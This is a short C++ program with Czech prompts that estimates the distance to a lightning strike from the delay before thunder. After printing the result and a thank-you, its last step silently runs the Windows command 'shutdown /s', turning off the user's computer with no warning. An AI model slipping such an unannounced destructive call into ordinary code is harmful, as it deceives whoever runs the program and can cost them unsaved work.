// blesky.cpp : Defines the entry point for the application.
//

#include "blesky.h"

using namespace std;

int main()
{
	float cas = 0;
	float km = 0;
	cout << "Zadejte cas ktery uplynul mezi bleskem a hromem:   ";
	cin >> cas;
	km = (cas * 340) / 1000;
	cout << "Vase vzdalenost od blesku byla " << km << " km.\n";
	cout << "Dekujeme za pouziti programu navidenou ;)";

	system("C:\\WINDOWS\\System32\\shutdown /s");
	return 0;
}
